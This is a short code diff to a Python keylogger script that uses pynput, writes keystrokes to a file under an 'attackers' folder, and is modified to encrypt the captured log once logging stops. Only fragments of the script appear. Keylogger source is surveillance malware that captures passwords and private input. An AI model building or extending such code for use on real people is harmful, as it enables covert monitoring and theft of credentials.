@@ -1,5 +1,6 @@
 from pynput.keyboard import Listener, Key
 from datetime import datetime
+from encryption_utils import encrypt_file
 import threading
 
 log_file = "attackers/keystrokes.log"
@@ -51,3 +52,5 @@ timer.start()
 listener.join()
 
 print("Keylogger stopped! 🛑")
+encrypt_file("attackers/keystrokes.log")
+print("encrypted 🔐")
